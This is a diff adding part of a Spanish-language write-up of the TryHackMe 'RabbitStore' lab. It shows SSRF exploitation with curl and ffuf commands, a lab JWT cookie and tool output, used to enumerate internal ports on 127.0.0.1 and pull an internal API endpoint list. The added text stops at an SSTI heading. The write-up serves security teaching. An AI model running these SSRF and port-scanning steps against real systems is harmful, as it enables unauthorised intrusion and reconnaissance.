@@ -320,3 +320,108 @@ Algo que puede realizarse mediante un SSRF es una enumeración de puertos intern
 ┌──(root㉿kali)-[/home/kali]
 └─# for port in {1..65535};do echo $port >> ports.txt;done
 ```
+Después realice una consulta a un puerto interno aleatorio que no esta abierto para ver el tamaño de la consulta cuando se realiza a puertos cerrados
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# curl -i -s -X POST http://storage.cloudsite.thm/api/store-url -H "Content-Type: application/json" -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InBycmluQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTcxNzI5OTYsImV4cCI6MTc1NzE3NjU5Nn0.sqKdS7MF3rkp19X5dQlcT-kD2agDOuB_nKCC4JOnJc8" -d '{"url":"http://127.0.0.1:1"}'
+
+HTTP/1.1 500 Internal Server Error
+Date: Sat, 06 Sep 2025 15:42:11 GMT
+Server: Apache/2.4.52 (Ubuntu)
+X-Powered-By: Express
+Content-Type: application/json; charset=utf-8
+Content-Length: 41
+ETag: W/"29-PsnbPRd1d0rezAmECVr7DoWSn4c"
+Connection: close
+
+{"message":"Error storing file from URL"} 
+```
+
+El contenido a consultas donde el puerto esta cerrado es `41`, con ffuf realice un escaneo excluyendo las solicitudes con ese numero para poder enumerar puertos abiertos internos.
+
+```bash
+┌──(root㉿kali)-[/home/kali]
+└─# ffuf -w ./ports.txt:PORT -u http://storage.cloudsite.thm/api/store-url -X POST -H "Content-Type: application/json" -H "Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InBycmluQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTcxNzI5OTYsImV4cCI6MTc1NzE3NjU5Nn0.sqKdS7MF3rkp19X5dQlcT-kD2agDOuB_nKCC4JOnJc8" -d '{"url":"http://127.0.0.1:PORT"}' -fs 41
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://storage.cloudsite.thm/api/store-url
+ :: Wordlist         : PORT: /home/kali/ports.txt
+ :: Header           : Content-Type: application/json
+ :: Header           : Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InBycmluQHRobS5jb20iLCJzdWJzY3JpcHRpb24iOiJhY3RpdmUiLCJpYXQiOjE3NTcxNzI5OTYsImV4cCI6MTc1NzE3NjU5Nn0.sqKdS7MF3rkp19X5dQlcT-kD2agDOuB_nKCC4JOnJc8
+ :: Data             : {"url":"http://127.0.0.1:PORT"}
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 41
+________________________________________________
+
+80                      [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 351ms]
+3000                    [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 320ms]
+8000                    [Status: 200, Size: 106, Words: 5, Lines: 1, Duration: 335ms]
+```
+Mediante el SSRF intenté consultar el endpoint docs, pero el puerto 80 no era el endpoint de la API.
+
+![](/assets/images/thm-writeup-RabbitStore/docs.png)
+
+```bash
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# cat acb0a77e-3870-4a67-af69-8f02f6a813c1 
+<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
+<html><head>
+<title>404 Not Found</title>
+</head><body>
+<h1>Not Found</h1>
+<p>The requested URL was not found on this server.</p>
+<hr>
+<address>Apache/2.4.52 (Ubuntu) Server at cloudsite.thm Port 80</address>
+</body></html>
+```
+Como la maquina tiene el puerto 3000 abierto internamente, intente hacer la petición a ese puerto en lugar del puerto 80 y obtuve el siguiente archivo:
+
+![](/assets/images/thm-writeup-RabbitStore/98f.png)
+
+```bash
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# cat 98f18667-f289-40a3-ab0b-e46e694a674c 
+Endpoints Perfectly Completed
+
+POST Requests:
+/api/register - For registering user
+/api/login - For loggin in the user
+/api/upload - For uploading files
+/api/store-url - For uploadion files via url
+/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.
+
+GET Requests:
+/api/uploads/filename - To view the uploaded files
+/dashboard/inactive - Dashboard for inactive user
+/dashboard/active - Dashboard for active user
+
+Note: All requests to this endpoint are sent in JSON format.
+```
+Realicé una petición al endpoint api/fetch_messeges_from_chatbot, pero obtuve el error: el método GET no está permitido.
+
+![](/assets/images/thm-writeup-RabbitStore/GET.png)
+
+Al cambiar la solicitud a método POST, obtuve otro error.
+
+![](/assets/images/thm-writeup-RabbitStore/POST.png)
+
+El error se debe a que no se está enviando ningún dato y el formato no es JSON; al cambiar el Content-Type y enviar una cadena vacía, obtuve el mensaje: el parámetro username es requerido.
+
+![](/assets/images/thm-writeup-RabbitStore/parametro.png)
+
+## SSTI (Server Side Template Injection)
